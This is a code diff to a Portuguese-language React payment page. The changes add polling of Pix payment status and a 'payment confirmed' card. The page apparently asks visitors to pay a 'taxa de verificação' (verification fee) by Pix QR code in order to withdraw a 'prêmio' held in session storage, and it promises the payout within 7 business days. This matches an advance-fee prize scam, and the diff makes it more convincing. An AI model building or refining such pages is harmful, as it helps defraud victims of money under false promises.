@@ -1,8 +1,8 @@
 import { createFileRoute } from "@tanstack/react-router";
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import QRCode from "qrcode";
-import { Copy, Check, ShieldCheck } from "lucide-react";
-import { createPixTransaction } from "../lib/pix.functions";
+import { Copy, Check, ShieldCheck, CheckCircle2 } from "lucide-react";
+import { createPixTransaction, checkPixStatus } from "../lib/pix.functions";
 
 export const Route = createFileRoute("/formulario")({
   head: () => ({
@@ -46,6 +46,9 @@ function FormularioPage() {
   const [pixCode, setPixCode] = useState("");
   const [loading, setLoading] = useState(false);
   const [errorMsg, setErrorMsg] = useState("");
+  const [externalId, setExternalId] = useState("");
+  const [paid, setPaid] = useState(false);
+  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   useEffect(() => {
     const v = sessionStorage.getItem("premio");
@@ -56,6 +59,33 @@ function FormularioPage() {
     if (!showQr || !pixCode) return;
     QRCode.toDataURL(pixCode, { width: 320, margin: 1 }).then(setQrDataUrl);
   }, [showQr, pixCode]);
+
+  // Poll for payment confirmation
+  useEffect(() => {
+    if (!externalId || paid) return;
+    let stopped = false;
+
+    async function tick() {
+      try {
+        const res = await checkPixStatus({ data: { external_id: externalId } });
+        if (stopped) return;
+        if (res.ok && res.paid) {
+          setPaid(true);
+          if (pollRef.current) clearInterval(pollRef.current);
+        }
+      } catch {
+        /* noop */
+      }
+    }
+
+    tick();
+    pollRef.current = setInterval(tick, 4000);
+
+    return () => {
+      stopped = true;
+      if (pollRef.current) clearInterval(pollRef.current);
+    };
+  }, [externalId, paid]);
 
   const canSubmit = nome.trim().length >= 3 && pix.trim().length >= 3 && Boolean(banco);
 
@@ -80,6 +110,8 @@ function FormularioPage() {
         return;
       }
       setPixCode(res.pix_code);
+      setExternalId(res.external_id);
+      setPaid(false);
       setShowQr(true);
       setTimeout(() => {
         document.getElementById("qr-card")?.scrollIntoView({ behavior: "smooth", block: "start" });
@@ -173,7 +205,7 @@ function FormularioPage() {
         </button>
       </form>
 
-      {showQr && (
+      {showQr && !paid && (
         <div
           id="qr-card"
           className="mt-6 rounded-md border border-primary/30 bg-primary-soft/40 p-5 animate-in fade-in"
@@ -212,8 +244,27 @@ function FormularioPage() {
                 {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                 {copied ? "Copiado!" : "Copiar código"}
               </button>
+              <p className="mt-3 flex items-center gap-2 text-xs text-muted-foreground">
+                <span className="inline-block h-2 w-2 animate-pulse rounded-full bg-primary" />
+                Aguardando confirmação do pagamento...
+              </p>
             </div>
           </div>
+        </div>
+      )}
+
+      {paid && (
+        <div
+          id="qr-card"
+          className="mt-6 rounded-md border border-green-500/40 bg-green-50 p-6 text-center animate-in fade-in"
+        >
+          <CheckCircle2 className="mx-auto h-12 w-12 text-green-600" />
+          <h2 className="mt-3 text-xl font-extrabold text-green-700">Pagamento confirmado!</h2>
+          <p className="mt-2 text-sm text-green-800">
+            Recebemos sua taxa de verificação. Seu saque de{" "}
+            <b>R$ {premio.toLocaleString("pt-BR")}</b> será processado em até 7 dias úteis na chave
+            Pix informada.
+          </p>
         </div>
       )}
     </div>
